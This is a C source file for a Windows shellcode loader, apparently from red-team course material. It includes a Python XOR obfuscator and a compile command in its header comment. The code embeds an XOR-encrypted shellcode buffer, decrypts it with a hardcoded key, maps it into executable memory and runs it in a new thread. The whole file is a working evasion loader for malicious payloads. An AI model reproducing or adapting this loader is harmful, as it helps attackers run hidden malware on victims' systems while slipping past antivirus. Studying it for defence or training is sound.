/*

Based on RTO Course from Sektor 7 Institute. 

https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
https://docs.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory
https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject



@ECHO OFF

cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

python XOR'er from Sektor7 RTO Course

import sys

KEY = "Sektor7RTOCourse"

def xor(data, key):
	
	key = str(key)
	l = len(key)
	output_str = ""

	for i in range(len(data)):
		current = data[i]
		current_key = key[i % len(key)]
		output_str += chr(ord(current) ^ ord(current_key))
	
	return output_str

def printCiphertext(ciphertext):
	print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')



try:
    plaintext = open(sys.argv[1], "rb").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()


ciphertext = xor(plaintext, KEY)
print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int XOR(char * payload, size_t payload_len, char * key, size_t key_len){
	int j;
	
	j = 0;
	for (int i = 0; i < payload_len; i++) {
		if (j == key_len - 1) j = 0;

		payload[i] = payload[i] ^ key[j];
		j++;
	}
}

unsigned char buf[] = { 0xaf, 0x2d, 0xe8, 0x90, 0x9f, 0x9a, 0xf7, 0x52, 0x54, 0x4f, 0x2, 0x3e, 0x34, 0x22, 0x21, 0x34, 0x5, 0x2d, 0x5a, 0xa6, 0xa, 0x3a, 0xbc, 0x0, 0x34, 0x7, 0xc8, 0x3d, 0x6d, 0x3a, 0xf8, 0x37, 0x73, 0x2d, 0xe0, 0x6, 0x3f, 0x3a, 0x38, 0xe5, 0x1e, 0x5, 0xe, 0x5e, 0xbc, 0x3a, 0x42, 0xa5, 0xff, 0x59, 0xa, 0x8, 0x6d, 0x5e, 0x17, 0x13, 0x95, 0x86, 0x4e, 0x2e, 0x74, 0xb3, 0x91, 0x88, 0x1, 0x24, 0x3a, 0x3c, 0xe4, 0x20, 0x17, 0xd9, 0x16, 0x73, 0xb, 0x6e, 0xa5, 0xf9, 0xf3, 0xed, 0x53, 0x65, 0x6b, 0x3c, 0xea, 0xb2, 0x43, 0x35, 0x1c, 0x4e, 0x93, 0x3f, 0xfe, 0x3a, 0x6b, 0x21, 0xd8, 0x25, 0x4b, 0x3d, 0x6e, 0xa2, 0xd4, 0x4, 0x1c, 0xb0, 0x8a, 0x2e, 0xfe, 0x46, 0xfb, 0x2d, 0x52, 0xb3, 0x26, 0x45, 0xa6, 0x3a, 0x6, 0x92, 0xf8, 0xe, 0x82, 0xa6, 0x78, 0x33, 0x72, 0xa4, 0x6b, 0x85, 0x1e, 0x85, 0x23, 0x71, 0x7b, 0x76, 0x5c, 0xa, 0x7a, 0xbe, 0x0, 0xaa, 0x2b, 0x21, 0xd8, 0x25, 0x4f, 0x3d, 0x6e, 0xa2, 0x51, 0x13, 0xdf, 0x43, 0xb, 0x2b, 0xfe, 0x32, 0x6f, 0x2c, 0x52, 0xb5, 0x2a, 0xff, 0x6b, 0xfa, 0x7f, 0x53, 0x84, 0xe, 0x1b, 0x2e, 0x2d, 0x2c, 0x2a, 0x3f, 0x12, 0x3d, 0x2a, 0x2d, 0x2e, 0x28, 0x7f, 0xd1, 0xb8, 0x6f, 0x2, 0x3d, 0x8a, 0x92, 0x2b, 0x24, 0xa, 0x3f, 0x23, 0xff, 0x7d, 0x9b, 0x60, 0xad, 0xab, 0xb0, 0x1e, 0x27, 0xcf, 0x73, 0x73, 0x65, 0x53, 0x65, 0x6b, 0x74, 0x6f, 0x3a, 0xba, 0xdf, 0x55, 0x4e, 0x43, 0x6f, 0x34, 0xc8, 0x42, 0xee, 0x3c, 0xe2, 0x94, 0xa1, 0xd4, 0x82, 0x82, 0xf0, 0x2, 0xe, 0xf9, 0xc9, 0xe0, 0xcf, 0xee, 0x9a, 0x86, 0x2d, 0xe8, 0xb0, 0x47, 0x4e, 0x31, 0x2e, 0x5e, 0xcf, 0xb8, 0x8f, 0x0, 0x77, 0xc8, 0x22, 0x40, 0x17, 0x4, 0x1e, 0x6f, 0x2b, 0x76, 0xdb, 0x8e, 0xb0, 0x96, 0xc, 0x14, 0x1e, 0x10, 0x4b, 0x36, 0x1d, 0xe, 0x74 };
unsigned int buf_length = sizeof(buf);
char key[] = "Sektor7RTOCourse";
unsigned int key_len = sizeof(key);

int wmain(void){

LPVOID exec_payload;
BOOL vp;
PDWORD lpflOldProtect = 0;
HANDLE new_thread;


printf("\nsize of payload is: %d\n", buf_length);


exec_payload = VirtualAlloc(0, buf_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

if (exec_payload != NULL) {
    printf("\ngood call to VirtualAlloc\n");
} else {
    printf("\nVirtual Alloc didnt work :/ \n");
    exit(-1);
};

XOR((char *)buf, buf_length, key, key_len);


RtlMoveMemory(exec_payload,buf,buf_length);
printf("\nMem Moved...\n");


vp = VirtualProtect(exec_payload, buf_length, PAGE_EXECUTE_READ, &lpflOldProtect);

if (vp == 0){
    printf("\nfailed to virtualprotect\n");
    exit(-1);
} else {
    printf("\nvirtual protect g2g\n");

printf("%-20s : 0x%-016p\n", "payload addr", (void *)buf);
printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_payload);

printf("\nDebug Breakpoint!\n");
getchar();    

    new_thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_payload, 0,0,0);
    if (new_thread == NULL){
        printf("\nCreateThread failed :/ \n");
        exit(-1);
    } else {
    printf("\nCreateThread worked!\n");
    WaitForSingleObject(new_thread, -1);
}

};
};